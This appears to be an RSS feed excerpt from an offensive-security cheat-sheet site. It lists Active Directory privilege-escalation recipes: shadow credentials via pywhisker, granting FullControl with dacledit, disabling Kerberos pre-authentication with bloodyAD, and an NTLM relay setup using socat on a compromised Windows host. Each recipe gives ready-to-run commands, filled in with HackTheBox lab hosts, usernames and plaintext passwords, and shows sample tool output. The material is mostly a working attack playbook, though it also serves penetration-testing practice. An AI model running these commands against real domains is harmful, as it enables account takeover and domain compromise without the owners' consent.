channel.title: Shadow Credentials on TLDRBins
channel.description: Recent content in Shadow Credentials on TLDRBins

item.title: AddKeyCredentialLink
item.description: Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps $ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT3Bfq' --dc-ip 10.10.11.175 -t 'sflowers' --use-ldaps [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute 1. Add shadow credentials python3 pywhisker.

item.title: GenericAll
item.description: Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps Impacket v0.

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows # Enable Account (if Disabled) sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata> . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser '<TARGET_USER>' | ConvertFrom-UACValue PS C:\programdata> Get-DomainUser 'user' | ConvertFrom-UACValue Get-DomainUser 'user' | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.

item.title: NTLM Relay Attack
item.description: NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat 2. Enable webdav (In Windows Target) $Source = @" using System; using System.
